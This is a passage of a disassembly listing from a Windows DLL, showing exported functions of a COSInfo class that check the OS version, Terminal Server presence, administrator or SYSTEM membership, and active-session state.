		pop	ecx

loc_6AF46924:				; CODE XREF: sub_6AF4690E+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4690E	endp

; Exported entry 940.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal940
Ordinal940	proc near		; CODE XREF: Ordinal939+28p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		xor	eax, eax
		inc	eax
		cmp	[ecx+14h], eax
		jnz	short loc_6AF4694D
		cmp	dword ptr [ecx+8], 4
		jnz	short loc_6AF46946
		cmp	dword ptr [ecx+0Ch], 0Ah
		jnz	short loc_6AF46946
		cmp	word ptr [ecx+10h], 7CEh
		ja	short locret_6AF46957

loc_6AF46946:				; CODE XREF: Ordinal940+Cj
					; Ordinal940+12j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF46951

loc_6AF4694D:				; CODE XREF: Ordinal940+6j
		xor	eax, eax
		jmp	short locret_6AF46957
; ---------------------------------------------------------------------------

loc_6AF46951:				; CODE XREF: Ordinal940+21j
		push	eax
		call	Ordinal941

locret_6AF46957:			; CODE XREF: Ordinal940+1Aj
					; Ordinal940+25j
		retn	4
Ordinal940	endp

; Exported entry 945.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal945
Ordinal945	proc near		; CODE XREF: Ordinal953+45p
					; Ordinal954+89p ...

arg_0		= dword	ptr  4

		cmp	dword ptr [ecx+14h], 2
		jnz	short loc_6AF46978
		cmp	dword ptr [ecx+8], 5
		jnz	short loc_6AF46971
		cmp	dword ptr [ecx+0Ch], 0
		jnz	short loc_6AF46971
		xor	eax, eax
		inc	eax
		jmp	short locret_6AF46983
; ---------------------------------------------------------------------------

loc_6AF46971:				; CODE XREF: Ordinal945+Aj
					; Ordinal945+10j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF4697C

loc_6AF46978:				; CODE XREF: Ordinal945+4j
		xor	eax, eax
		jmp	short locret_6AF46983
; ---------------------------------------------------------------------------

loc_6AF4697C:				; CODE XREF: Ordinal945+1Cj
		push	1
		call	Ordinal946

locret_6AF46983:			; CODE XREF: Ordinal945+15j
					; Ordinal945+20j
		retn	4
Ordinal945	endp

; Exported entry 952.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal952
Ordinal952	proc near		; CODE XREF: Ordinal953+3Cp
					; Ordinal954+22p ...
		push	esi
		mov	esi, ecx
		lea	eax, [esi+0D8h]
		cmp	dword ptr [eax], 0
		jnz	short loc_6AF469D8
		push	offset aKernel32_dll_0 ; "KERNEL32.DLL"
		lea	ecx, [esi+0DCh]
		mov	dword ptr [eax], 1
		call	Ordinal922
		test	eax, eax
		jnz	short loc_6AF469B9
		push	offset aCosinfoInitial ; "COSInfo::Initialize()	: m_Kernel32.Load"...
		call	sub_6AF3101A
		pop	ecx

loc_6AF469B9:				; CODE XREF: Ordinal952+26j
		push	offset aWtsapi32_dll ; "WTSAPI32.DLL"
		lea	ecx, [esi+0F0h]
		call	Ordinal928
		test	eax, eax
		jnz	short loc_6AF469D8
		push	offset aCosinfoIniti_0 ; "COSInfo::Initialize()	: m_WTSAPI32.Load"...
		call	sub_6AF3101A
		pop	ecx

loc_6AF469D8:				; CODE XREF: Ordinal952+Cj
					; Ordinal952+45j
		pop	esi
		retn
Ordinal952	endp

; Exported entry 953.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=78h

		public Ordinal953
Ordinal953	proc near		; CODE XREF: Ordinal947+Fp
					; DATA XREF: .rdata:off_6AF66098o

var_C8		= byte ptr -0C8h
var_B8		= dword	ptr -0B8h
Type		= dword	ptr -0B4h
var_B0		= byte ptr -0B0h
Args		= dword	ptr -0A4h
Dst		= dword	ptr -0A0h
var_8		= word ptr -8
var_4		= dword	ptr -4

		push	ebp
		lea	ebp, [esp-78h]
		sub	esp, 0C8h
		mov	eax, ___security_cookie
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+14h], 2
		mov	[ebp+78h+var_4], eax
		jz	short loc_6AF469FD
		xor	eax, eax
		jmp	loc_6AF46BBE
; ---------------------------------------------------------------------------

loc_6AF469FD:				; CODE XREF: Ordinal953+1Aj
		push	1
		mov	ecx, esi
		call	Ordinal946
		test	eax, eax
		jz	short loc_6AF46A12
		xor	eax, eax
		inc	eax
		jmp	loc_6AF46BBE
; ---------------------------------------------------------------------------

loc_6AF46A12:				; CODE XREF: Ordinal953+2Ej
		push	ebx
		push	edi		; Args
		mov	ecx, esi
		call	Ordinal952
		push	1
		mov	ecx, esi
		call	Ordinal945
		test	eax, eax
		jz	short loc_6AF46A99
		mov	eax, [esi+0E4h]
		xor	ebx, ebx
		cmp	eax, ebx
		jz	short loc_6AF46A7F
		cmp	[esi+0E8h], ebx
		jz	short loc_6AF46A7F
		push	6
		push	40h
		push	ebx
		push	ebx
		call	eax
		mov	edi, 9Ch
		push	edi		; Size
		mov	[ebp+78h+var_B8], eax
		lea	eax, [ebp+78h+Dst]
		push	ebx		; Val
		push	eax		; Dst
		mov	[ebp+78h+Type],	edx
		call	memset
		add	esp, 0Ch
		push	[ebp+78h+Type]
		lea	eax, [ebp+78h+Dst]
		push	[ebp+78h+var_B8]
		mov	[ebp+78h+Dst], edi
		push	40h
		push	eax
		mov	[ebp+78h+var_8], 10h
		call	dword ptr [esi+0E8h]
		mov	ebx, eax
		jmp	loc_6AF46BBA
; ---------------------------------------------------------------------------

loc_6AF46A7F:				; CODE XREF: Ordinal953+58j
					; Ordinal953+60j
		push	offset aCosinfoIstermi ; "COSInfo::IsTerminalServerEx()	: m_Kerne"...
		call	sub_6AF3102E
		pop	ecx
		mov	dword ptr [esi+0D4h], 490h
		jmp	loc_6AF46BBA
; ---------------------------------------------------------------------------

loc_6AF46A99:				; CODE XREF: Ordinal953+4Cj
		lea	ecx, [ebp+78h+var_B0]
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aSystemCurren_0 ; "System\\CurrentControlSet\\Control\\Produc"...
		push	80000002h	; hKey
		lea	ecx, [ebp+78h+var_B0]
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF46AC9
		push	offset aCosinfoIster_0 ; "COSInfo::IsTerminalServerEx()	: reg.Ope"...
		jmp	loc_6AF46B9E
; ---------------------------------------------------------------------------

loc_6AF46AC9:				; CODE XREF: Ordinal953+E3j
		lea	eax, [ebp+78h+Args]
		push	eax		; lpcbData
		push	ebx		; lpData
		lea	eax, [ebp+78h+Type]
		push	eax		; lpType
		push	ebx		; lpReserved
		push	offset aProductsuite ; "ProductSuite"
		lea	ecx, [ebp+78h+var_B0]
		mov	[ebp+78h+Type],	ebx
		mov	[ebp+78h+Args],	ebx
		call	Ordinal1018
		test	eax, eax
		jz	loc_6AF46B99
		cmp	[ebp+78h+Args],	ebx
		jz	loc_6AF46B99
		lea	ecx, [ebp+78h+var_C8]
		call	Ordinal861
		push	[ebp+78h+Args]	; Args
		lea	ecx, [ebp+78h+var_C8]
		call	Ordinal870
		mov	edi, eax
		cmp	edi, ebx
		jnz	short loc_6AF46B27
		push	offset aCosinfoIster_1 ; "COSInfo::IsTerminalServerEx()	: mem.New"...
		call	sub_6AF3102E
		pop	ecx
		mov	dword ptr [esi+0D4h], 0Eh
		jmp	short loc_6AF46B8F
; ---------------------------------------------------------------------------

loc_6AF46B27:				; CODE XREF: Ordinal953+134j
		lea	eax, [ebp+78h+Args]
		push	eax		; lpcbData
		push	edi		; lpData
		lea	eax, [ebp+78h+Type]
		push	eax		; lpType
		push	ebx		; lpReserved
		push	offset aProductsuite ; "ProductSuite"
		lea	ecx, [ebp+78h+var_B0]
		call	Ordinal1018
		test	eax, eax
		jz	short loc_6AF46B76
		cmp	[ebp+78h+Type],	7
		jnz	short loc_6AF46B76
		cmp	[edi], bl
		mov	esi, edi
		jz	short loc_6AF46B8F

loc_6AF46B4E:				; CODE XREF: Ordinal953+193j
		push	offset aTerminalServer ; "Terminal Server"
		push	esi		; unsigned __int8 *
		call	ds:_mbsicmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF46B71
		push	esi		; lpString
		call	ds:lstrlenA
		lea	esi, [esi+eax+1]
		cmp	[esi], bl
		jnz	short loc_6AF46B4E
		jmp	short loc_6AF46B8F
; ---------------------------------------------------------------------------

loc_6AF46B71:				; CODE XREF: Ordinal953+184j
		xor	ebx, ebx
		inc	ebx
		jmp	short loc_6AF46B8F
; ---------------------------------------------------------------------------

loc_6AF46B76:				; CODE XREF: Ordinal953+166j
					; Ordinal953+16Cj
		push	offset aCosinfoIster_2 ; "COSInfo::IsTerminalServerEx()	: reg.Que"...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+78h+var_B0]
		call	Ordinal236
		mov	[esi+0D4h], eax

loc_6AF46B8F:				; CODE XREF: Ordinal953+14Bj
					; Ordinal953+172j ...
		lea	ecx, [ebp+78h+var_C8]
		call	Ordinal863
		jmp	short loc_6AF46BB2
; ---------------------------------------------------------------------------

loc_6AF46B99:				; CODE XREF: Ordinal953+10Ej
					; Ordinal953+117j
		push	offset aCosinfoIster_2 ; "COSInfo::IsTerminalServerEx()	: reg.Que"...

loc_6AF46B9E:				; CODE XREF: Ordinal953+EAj
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+78h+var_B0]
		call	Ordinal236
		mov	[esi+0D4h], eax

loc_6AF46BB2:				; CODE XREF: Ordinal953+1BDj
		lea	ecx, [ebp+78h+var_B0]
		call	Ordinal990

loc_6AF46BBA:				; CODE XREF: Ordinal953+A0j
					; Ordinal953+BAj
		pop	edi
		mov	eax, ebx
		pop	ebx

loc_6AF46BBE:				; CODE XREF: Ordinal953+1Ej
					; Ordinal953+33j
		mov	ecx, [ebp+78h+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		add	ebp, 78h
		leave
		retn
Ordinal953	endp ; sp-analysis failed

; Exported entry 954.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal954
Ordinal954	proc near		; CODE XREF: Ordinal950+Fp
					; DATA XREF: .rdata:off_6AF66098o

var_34		= byte ptr -34h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
Args		= dword	ptr -1Ch
IsMember	= dword	ptr -18h
pSid		= dword	ptr -14h
hObject		= dword	ptr -10h
pIdentifierAuthority= _SID_IDENTIFIER_AUTHORITY	ptr -0Ch
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		mov	eax, ___security_cookie
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+14h], 2
		mov	[ebp+var_4], eax
		jz	short loc_6AF46BEB
		xor	eax, eax
		inc	eax
		jmp	loc_6AF46DBA
; ---------------------------------------------------------------------------

loc_6AF46BEB:				; CODE XREF: Ordinal954+15j
		push	ebx
		mov	ecx, esi
		call	Ordinal952
		xor	ebx, ebx
		or	[ebp+hObject], 0FFFFFFFFh
		lea	eax, [ebp+pSid]
		push	eax		; pSid
		push	ebx		; nSubAuthority7
		push	ebx		; nSubAuthority6
		push	ebx		; nSubAuthority5
		push	ebx		; nSubAuthority4
		push	ebx		; nSubAuthority3
		push	ebx		; nSubAuthority2
		push	220h		; nSubAuthority1
		push	20h		; nSubAuthority0
		push	2		; nSubAuthorityCount
		lea	eax, [ebp+pIdentifierAuthority]
		push	eax		; pIdentifierAuthority
		mov	[ebp+IsMember],	ebx
		mov	[ebp+pSid], ebx
		mov	[ebp+pIdentifierAuthority.Value], bl
		mov	[ebp+pIdentifierAuthority.Value+1], bl
		mov	[ebp+pIdentifierAuthority.Value+2], bl
		mov	[ebp+pIdentifierAuthority.Value+3], bl
		mov	[ebp+pIdentifierAuthority.Value+4], bl
		mov	[ebp+pIdentifierAuthority.Value+5], 5
		call	AllocateAndInitializeSid
		test	eax, eax
		jnz	short loc_6AF46C51
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCosinfoIsadmin ; "COSInfo::IsAdministratorEx() : Allocate"...
		mov	[esi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	loc_6AF46D96
; ---------------------------------------------------------------------------

loc_6AF46C51:				; CODE XREF: Ordinal954+65j
		push	1
		mov	ecx, esi
		call	Ordinal945
		test	eax, eax
		jz	short loc_6AF46C7B
		lea	eax, [ebp+IsMember]
		push	eax		; IsMember
		push	[ebp+pSid]	; SidToCheck
		push	ebx		; TokenHandle
		call	CheckTokenMembership
		test	eax, eax
		jnz	loc_6AF46D96
		mov	[ebp+IsMember],	ebx
		jmp	loc_6AF46D96
; ---------------------------------------------------------------------------

loc_6AF46C7B:				; CODE XREF: Ordinal954+90j
		push	edi
		lea	eax, [ebp+hObject]
		push	eax		; TokenHandle
		push	ebx		; OpenAsSelf
		push	8		; DesiredAccess
		call	ds:GetCurrentThread
		push	eax		; ThreadHandle
		call	OpenThreadToken
		test	eax, eax
		mov	edi, ds:GetLastError
		jnz	short loc_6AF46CD4
		call	edi ; GetLastError
		cmp	eax, 3F0h
		jnz	short loc_6AF46CBA
		lea	eax, [ebp+hObject]
		push	eax		; TokenHandle
		push	8		; DesiredAccess
		call	ds:GetCurrentProcess
		push	eax		; ProcessHandle
		call	OpenProcessToken
		test	eax, eax
		jnz	short loc_6AF46CD4

loc_6AF46CBA:				; CODE XREF: Ordinal954+D5j
		call	edi ; GetLastError
		push	eax		; Args
		push	offset aCosinfoIsadm_0 ; "COSInfo::IsAdministratorEx() : OpenProc"...

loc_6AF46CC2:				; CODE XREF: Ordinal954+12Fj
		mov	[esi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	loc_6AF46D95
; ---------------------------------------------------------------------------

loc_6AF46CD4:				; CODE XREF: Ordinal954+CCj
					; Ordinal954+ECj
		lea	eax, [ebp+Args]
		push	eax		; ReturnLength
		push	ebx		; TokenInformationLength
		push	ebx		; TokenInformation
		push	2		; TokenInformationClass
		push	[ebp+hObject]	; TokenHandle
		mov	[ebp+Args], ebx
		call	GetTokenInformation
		test	eax, eax
		jnz	short loc_6AF46CFD
		call	edi ; GetLastError
		cmp	eax, 7Ah
		jz	short loc_6AF46CFD
		call	edi ; GetLastError
		push	eax
		push	offset aCosinfoIsadm_1 ; "COSInfo::IsAdministratorEx() : GetToken"...
		jmp	short loc_6AF46CC2
; ---------------------------------------------------------------------------

loc_6AF46CFD:				; CODE XREF: Ordinal954+11Ej
					; Ordinal954+125j
		lea	ecx, [ebp+var_34]
		call	Ordinal861
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_34]
		call	Ordinal870
		cmp	eax, ebx
		mov	[ebp+var_24], eax
		jnz	short loc_6AF46D2D
		push	offset aCosinfoIsadm_2 ; "COSInfo::IsAdministratorEx() : mem.NewA"...
		mov	dword ptr [esi+0D4h], 0Eh
		call	sub_6AF3102E
		jmp	short loc_6AF46D58
; ---------------------------------------------------------------------------

loc_6AF46D2D:				; CODE XREF: Ordinal954+149j
		lea	ecx, [ebp+Args]
		push	ecx		; ReturnLength
		push	[ebp+Args]	; TokenInformationLength
		push	eax		; TokenInformation
		push	2		; TokenInformationClass
		push	[ebp+hObject]	; TokenHandle
		call	GetTokenInformation
		test	eax, eax
		jnz	short loc_6AF46D5B
		call	edi ; GetLastError
		push	eax		; Args
		push	offset aCosinfoIsadm_1 ; "COSInfo::IsAdministratorEx() : GetToken"...
		mov	[esi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF46D58:				; CODE XREF: Ordinal954+15Fj
		pop	ecx
		jmp	short loc_6AF46D8D
; ---------------------------------------------------------------------------

loc_6AF46D5B:				; CODE XREF: Ordinal954+176j
		mov	esi, [ebp+var_24]
		cmp	[esi], ebx
		mov	[ebp+var_20], ebx
		jbe	short loc_6AF46D8D
		lea	edi, [esi+4]

loc_6AF46D68:				; CODE XREF: Ordinal954+1B6j
		push	dword ptr [edi]	; pSid2
		push	[ebp+pSid]	; pSid1
		call	EqualSid
		test	eax, eax
		jnz	short loc_6AF46D86
		inc	[ebp+var_20]
		mov	eax, [ebp+var_20]
		add	edi, 8
		cmp	eax, [esi]
		jb	short loc_6AF46D68
		jmp	short loc_6AF46D8D
; ---------------------------------------------------------------------------

loc_6AF46D86:				; CODE XREF: Ordinal954+1A9j
		mov	[ebp+IsMember],	1

loc_6AF46D8D:				; CODE XREF: Ordinal954+18Dj
					; Ordinal954+197j ...
		lea	ecx, [ebp+var_34]
		call	Ordinal863

loc_6AF46D95:				; CODE XREF: Ordinal954+103j
		pop	edi

loc_6AF46D96:				; CODE XREF: Ordinal954+80j
					; Ordinal954+A1j ...
		cmp	[ebp+pSid], ebx
		jz	short loc_6AF46DA7
		push	[ebp+pSid]	; pSid
		call	FreeSid
		mov	[ebp+pSid], ebx

loc_6AF46DA7:				; CODE XREF: Ordinal954+1CDj
		cmp	[ebp+hObject], 0FFFFFFFFh
		pop	ebx
		jz	short loc_6AF46DB7
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle

loc_6AF46DB7:				; CODE XREF: Ordinal954+1E0j
		mov	eax, [ebp+IsMember]

loc_6AF46DBA:				; CODE XREF: Ordinal954+1Aj
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
Ordinal954	endp ; sp-analysis failed

; Exported entry 955.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal955
Ordinal955	proc near		; CODE XREF: Ordinal951+Fp
					; DATA XREF: .rdata:off_6AF66098o

var_30		= byte ptr -30h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
Args		= dword	ptr -18h
pSid		= dword	ptr -14h
hObject		= dword	ptr -10h
pIdentifierAuthority= _SID_IDENTIFIER_AUTHORITY	ptr -0Ch
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		mov	eax, ___security_cookie
		push	edi
		mov	edi, ecx
		cmp	dword ptr [edi+14h], 2
		mov	[ebp+var_4], eax
		jz	short loc_6AF46DE3
		xor	eax, eax
		jmp	loc_6AF46F6B
; ---------------------------------------------------------------------------

loc_6AF46DE3:				; CODE XREF: Ordinal955+15j
		push	ebx
		mov	ecx, edi
		call	Ordinal952
		xor	ebx, ebx
		or	[ebp+hObject], 0FFFFFFFFh
		lea	eax, [ebp+pSid]
		push	eax		; pSid
		push	ebx		; nSubAuthority7
		push	ebx		; nSubAuthority6
		push	ebx		; nSubAuthority5
		push	ebx		; nSubAuthority4
		push	ebx		; nSubAuthority3
		push	ebx		; nSubAuthority2
		push	ebx		; nSubAuthority1
		push	12h		; nSubAuthority0
		push	1		; nSubAuthorityCount
		lea	eax, [ebp+pIdentifierAuthority]
		push	eax		; pIdentifierAuthority
		mov	[ebp+var_1C], ebx
		mov	[ebp+pSid], ebx
		mov	[ebp+pIdentifierAuthority.Value], bl
		mov	[ebp+pIdentifierAuthority.Value+1], bl
		mov	[ebp+pIdentifierAuthority.Value+2], bl
		mov	[ebp+pIdentifierAuthority.Value+3], bl
		mov	[ebp+pIdentifierAuthority.Value+4], bl
		mov	[ebp+pIdentifierAuthority.Value+5], 5
		call	AllocateAndInitializeSid
		test	eax, eax
		jnz	short loc_6AF46E45
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCosinfoIssyste ; "COSInfo::IsSystemEx()	: AllocateAndInit"...
		mov	[edi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	loc_6AF46F47
; ---------------------------------------------------------------------------

loc_6AF46E45:				; CODE XREF: Ordinal955+60j
		push	esi
		lea	eax, [ebp+hObject]
		push	eax		; TokenHandle
		push	ebx		; OpenAsSelf
		push	8		; DesiredAccess
		call	ds:GetCurrentThread
		push	eax		; ThreadHandle
		call	OpenThreadToken
		test	eax, eax
		mov	esi, ds:GetLastError
		jnz	short loc_6AF46E9E
		call	esi ; GetLastError
		cmp	eax, 3F0h
		jnz	short loc_6AF46E84
		lea	eax, [ebp+hObject]
		push	eax		; TokenHandle
		push	8		; DesiredAccess
		call	ds:GetCurrentProcess
		push	eax		; ProcessHandle
		call	OpenProcessToken
		test	eax, eax
		jnz	short loc_6AF46E9E

loc_6AF46E84:				; CODE XREF: Ordinal955+A6j
		call	esi ; GetLastError
		push	eax		; Args
		push	offset aCosinfoIssys_0 ; "COSInfo::IsSystemEx()	: OpenProcessToke"...

loc_6AF46E8C:				; CODE XREF: Ordinal955+100j
		mov	[edi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	loc_6AF46F46
; ---------------------------------------------------------------------------

loc_6AF46E9E:				; CODE XREF: Ordinal955+9Dj
					; Ordinal955+BDj
		lea	eax, [ebp+Args]
		push	eax		; ReturnLength
		push	ebx		; TokenInformationLength
		push	ebx		; TokenInformation
		push	1		; TokenInformationClass
		push	[ebp+hObject]	; TokenHandle
		mov	[ebp+Args], ebx
		call	GetTokenInformation
		test	eax, eax
		jnz	short loc_6AF46EC7
		call	esi ; GetLastError
		cmp	eax, 7Ah
		jz	short loc_6AF46EC7
		call	esi ; GetLastError
		push	eax
		push	offset aCosinfoIssys_1 ; "COSInfo::IsSystemEx()	: GetTokenInforma"...
		jmp	short loc_6AF46E8C
; ---------------------------------------------------------------------------

loc_6AF46EC7:				; CODE XREF: Ordinal955+EFj
					; Ordinal955+F6j
		lea	ecx, [ebp+var_30]
		call	Ordinal861
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_30]
		call	Ordinal870
		cmp	eax, ebx
		mov	[ebp+var_20], eax
		jnz	short loc_6AF46EF7
		push	offset aCosinfoIssys_2 ; "COSInfo::IsSystemEx()	: GlobalAlloc()	="...
		mov	dword ptr [edi+0D4h], 0Eh
		call	sub_6AF3102E
		jmp	short loc_6AF46F22
; ---------------------------------------------------------------------------

loc_6AF46EF7:				; CODE XREF: Ordinal955+11Aj
		lea	ecx, [ebp+Args]
		push	ecx		; ReturnLength
		push	[ebp+Args]	; TokenInformationLength
		push	eax		; TokenInformation
		push	1		; TokenInformationClass
		push	[ebp+hObject]	; TokenHandle
		call	GetTokenInformation
		test	eax, eax
		jnz	short loc_6AF46F25
		call	esi ; GetLastError
		push	eax		; Args
		push	offset aCosinfoIssys_1 ; "COSInfo::IsSystemEx()	: GetTokenInforma"...
		mov	[edi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF46F22:				; CODE XREF: Ordinal955+130j
		pop	ecx
		jmp	short loc_6AF46F3E
; ---------------------------------------------------------------------------

loc_6AF46F25:				; CODE XREF: Ordinal955+147j
		push	[ebp+pSid]	; pSid2
		mov	eax, [ebp+var_20]
		push	dword ptr [eax]	; pSid1
		call	EqualSid
		test	eax, eax
		jz	short loc_6AF46F3E
		mov	[ebp+var_1C], 1

loc_6AF46F3E:				; CODE XREF: Ordinal955+15Ej
					; Ordinal955+170j
		lea	ecx, [ebp+var_30]
		call	Ordinal863

loc_6AF46F46:				; CODE XREF: Ordinal955+D4j
		pop	esi

loc_6AF46F47:				; CODE XREF: Ordinal955+7Bj
		cmp	[ebp+pSid], ebx
		jz	short loc_6AF46F58
		push	[ebp+pSid]	; pSid
		call	FreeSid
		mov	[ebp+pSid], ebx

loc_6AF46F58:				; CODE XREF: Ordinal955+185j
		cmp	[ebp+hObject], 0FFFFFFFFh
		pop	ebx
		jz	short loc_6AF46F68
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle

loc_6AF46F68:				; CODE XREF: Ordinal955+198j
		mov	eax, [ebp+var_1C]

loc_6AF46F6B:				; CODE XREF: Ordinal955+19j
		mov	ecx, [ebp+var_4]
		pop	edi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
Ordinal955	endp ; sp-analysis failed

; Exported entry 939.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal939
Ordinal939	proc near		; CODE XREF: Ordinal937+5Cp
					; Ordinal938+5Cp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		xor	eax, eax
		inc	eax
		cmp	[ecx+14h], eax
		jnz	short loc_6AF46F99
		cmp	dword ptr [ecx+8], 4
		jnz	short loc_6AF46F92
		cmp	dword ptr [ecx+0Ch], 0Ah
		jnz	short loc_6AF46F92
		cmp	word ptr [ecx+10h], 7CEh
		jbe	short locret_6AF46FA3

loc_6AF46F92:				; CODE XREF: Ordinal939+Cj
					; Ordinal939+12j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF46F9D

loc_6AF46F99:				; CODE XREF: Ordinal939+6j
		xor	eax, eax
		jmp	short locret_6AF46FA3
; ---------------------------------------------------------------------------

loc_6AF46F9D:				; CODE XREF: Ordinal939+21j
		push	eax
		call	Ordinal940

locret_6AF46FA3:			; CODE XREF: Ordinal939+1Aj
					; Ordinal939+25j
		retn	4
Ordinal939	endp

; Exported entry 944.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal944
Ordinal944	proc near		; CODE XREF: Ordinal623+53p
					; Ordinal943+24p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		cmp	dword ptr [ecx+14h], 2
		jnz	short loc_6AF46FC4
		cmp	dword ptr [ecx+8], 4
		jnz	short loc_6AF46FBD
		cmp	dword ptr [ecx+0Ch], 0
		jnz	short loc_6AF46FBD
		xor	eax, eax
		inc	eax
		jmp	short locret_6AF46FCF
; ---------------------------------------------------------------------------

loc_6AF46FBD:				; CODE XREF: Ordinal944+Aj
					; Ordinal944+10j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF46FC8

loc_6AF46FC4:				; CODE XREF: Ordinal944+4j
		xor	eax, eax
		jmp	short locret_6AF46FCF
; ---------------------------------------------------------------------------

loc_6AF46FC8:				; CODE XREF: Ordinal944+1Cj
		push	1
		call	Ordinal945

locret_6AF46FCF:			; CODE XREF: Ordinal944+15j
					; Ordinal944+20j
		retn	4
Ordinal944	endp

; Exported entry 947.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal947
Ordinal947	proc near		; CODE XREF: Ordinal948+Fp
					; sub_6AF4C9A4+33p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+0C0h]
		cmp	dword ptr [edi], 0
		jnz	short loc_6AF46FF2
		call	Ordinal953
		mov	[esi+0BCh], eax
		mov	dword ptr [edi], 1

loc_6AF46FF2:				; CODE XREF: Ordinal947+Dj
		mov	eax, [esi+0BCh]
		pop	edi
		pop	esi
		retn
Ordinal947	endp

; Exported entry 948.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal948
Ordinal948	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+14h], 2
		jnz	short loc_6AF47013
		call	Ordinal947
		test	eax, eax
		jnz	short loc_6AF4701B

loc_6AF47013:				; CODE XREF: Ordinal948+Dj
		xor	eax, eax
		inc	eax
		jmp	loc_6AF47103
; ---------------------------------------------------------------------------

loc_6AF4701B:				; CODE XREF: Ordinal948+16j
		push	edi
		mov	ecx, esi
		call	Ordinal952
		lea	ecx, [esi+0F0h]
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF470F5
		mov	eax, [esi+0F8h]
		xor	edi, edi
		cmp	eax, edi
		jz	loc_6AF470F5
		cmp	[esi+100h], edi
		jz	loc_6AF470F5
		push	ebx
		lea	ecx, [ebp+var_C]
		push	ecx
		lea	ecx, [ebp+var_4]
		push	ecx
		push	10h
		push	0FFFFFFFFh
		push	edi
		mov	[ebp+var_8], 1
		mov	[ebp+var_4], edi
		mov	[ebp+var_C], edi
		call	eax
		test	eax, eax
		jz	short loc_6AF470AA
		mov	eax, [ebp+var_4]
		mov	bx, [eax]
		push	eax
		call	dword ptr [esi+100h]
		cmp	bx, di
		mov	[ebp+var_4], edi
		jz	short loc_6AF47093
		mov	[ebp+var_8], edi
		mov	[esi+0D4h], edi
		jmp	short loc_6AF470EF
; ---------------------------------------------------------------------------

loc_6AF47093:				; CODE XREF: Ordinal948+8Bj
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+var_4]
		push	eax
		push	8
		push	0FFFFFFFFh
		push	edi
		call	dword ptr [esi+0F8h]
		test	eax, eax
		jnz	short loc_6AF470C5

loc_6AF470AA:				; CODE XREF: Ordinal948+76j
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCosinfoIsactiv ; "COSInfo::IsActiveSession() : m_WTSAPI32"...
		mov	[esi+0D4h], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF470DE
; ---------------------------------------------------------------------------

loc_6AF470C5:				; CODE XREF: Ordinal948+ADj
		mov	eax, [ebp+var_4]
		mov	ebx, [eax]
		push	eax
		call	dword ptr [esi+100h]
		cmp	ebx, edi
		mov	[ebp+var_4], edi
		jz	short loc_6AF470EF
		mov	[esi+0D4h], edi

loc_6AF470DE:				; CODE XREF: Ordinal948+C8j
		cmp	[ebp+var_4], edi
		mov	[ebp+var_8], edi
		jz	short loc_6AF470EF
		push	[ebp+var_4]
		call	dword ptr [esi+100h]

loc_6AF470EF:				; CODE XREF: Ordinal948+96j
					; Ordinal948+DBj ...
		mov	eax, [ebp+var_8]
		pop	ebx
		jmp	short loc_6AF47102
; ---------------------------------------------------------------------------

loc_6AF470F5:				; CODE XREF: Ordinal948+35j
					; Ordinal948+45j ...
		xor	eax, eax
		mov	dword ptr [esi+0D4h], 490h
		inc	eax

loc_6AF47102:				; CODE XREF: Ordinal948+F8j
		pop	edi

loc_6AF47103:				; CODE XREF: Ordinal948+1Bj
		pop	esi
		leave
		retn
